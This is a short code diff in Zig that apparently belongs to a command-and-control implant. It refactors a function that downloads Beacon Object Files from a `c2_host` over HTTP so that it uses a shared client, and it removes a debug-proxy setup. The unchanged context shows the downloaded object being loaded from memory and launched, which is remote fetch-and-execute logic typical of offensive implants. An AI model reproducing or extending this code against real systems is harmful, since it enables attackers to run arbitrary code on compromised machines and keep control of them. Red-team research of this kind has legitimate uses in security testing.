@@ -14,28 +14,16 @@ const debug_proxy_enabled = false;
 const debug_proxy_host = "127.0.0.1";
 const debug_proxy_port = 8080;
 
-fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]const u8 {
+fn fetchBofContent(allocator: std.mem.Allocator, state: *State, bof_uri: []const u8) ![]const u8 {
     var headers = std.http.Headers.init(allocator);
     defer headers.deinit();
-
-    var http_client: std.http.Client = .{
-        .allocator = allocator,
-        .http_proxy = if (debug_proxy_enabled) .{
-            .allocator = allocator,
-            .headers = headers,
-            .protocol = .plain,
-            .host = debug_proxy_host,
-            .port = debug_proxy_port,
-        } else null,
-    };
-    defer http_client.deinit();
 
     const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, bof_uri });
     defer allocator.free(uri);
 
     const bof_url = try std.Uri.parse(uri);
 
-    var bof_req = try http_client.open(.GET, bof_url, headers, .{});
+    var bof_req = try state.http_client.open(.GET, bof_url, headers, .{});
     defer bof_req.deinit();
 
     try bof_req.send(.{});
@@ -149,7 +137,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     const bof_path = root.object.get("path").?.string;
 
     // fetch bof content
-    const bof_content = try fetchBofContent(allocator, bof_path);
+    const bof_content = try fetchBofContent(allocator, state, bof_path);
     defer allocator.free(bof_content);
 
     const bof_object = try bof.Object.initFromMemory(bof_content);
